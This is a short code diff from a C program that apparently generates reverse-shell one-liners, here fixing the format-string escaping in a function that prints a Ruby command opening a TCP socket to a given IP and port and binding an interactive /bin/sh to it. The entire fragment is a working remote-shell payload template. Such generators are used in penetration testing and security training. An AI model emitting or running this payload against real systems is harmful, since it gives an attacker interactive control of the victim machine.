@@ -119,7 +119,7 @@ void ruby(char *ip, char *port)
 {
     printf(FRED DEFAULT);
     printf
-        ("ruby -rsocket -e'f=TCPSocket.open(\"%s\",%s).to_i;exec sprintf(\"/bin/sh -i <&\%d >&\%d 2>&\%d\",f,f,f)'\n",
+        ("ruby -rsocket -e'f=TCPSocket.open(\"%s\",%s).to_i;exec sprintf(\"/bin/sh -i <&%%d >&%%d 2>&%%d\",f,f,f)'\n",
          ip, port);
     printf(RESET_TERM);
 }
